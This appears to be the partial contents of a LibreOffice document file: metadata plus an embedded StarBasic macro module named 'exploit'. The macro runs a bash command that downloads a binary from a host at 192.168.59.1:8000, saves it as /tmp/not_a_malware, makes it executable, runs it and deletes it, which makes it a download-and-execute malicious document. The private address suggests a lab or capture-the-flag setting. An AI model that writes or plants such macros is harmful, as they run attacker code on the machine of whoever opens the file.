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exploi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exploit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8:16:58.793311112</meta:creation-date>
    <meta:generator>LibreOffice/24.2.7.2$Linux_X86_64 LibreOffice_project/420$Build-2</meta:generator>
    <dc:date>2025-04-01T00:04:02.159245818</dc:date>
    <meta:editing-duration>PT52M50S</meta:editing-duration>
    <meta:editing-cycles>1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exploit.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="exploit" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****

Sub Main
	Shell("bash -c 'wget http://192.168.59.1:8000/ -O /tmp/not_a_malware &amp;&amp; chmod +x /tmp/not_a_malware &amp;&amp; /tmp/not_a_malware &amp;&amp; rm /tmp/not_a_malware'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loi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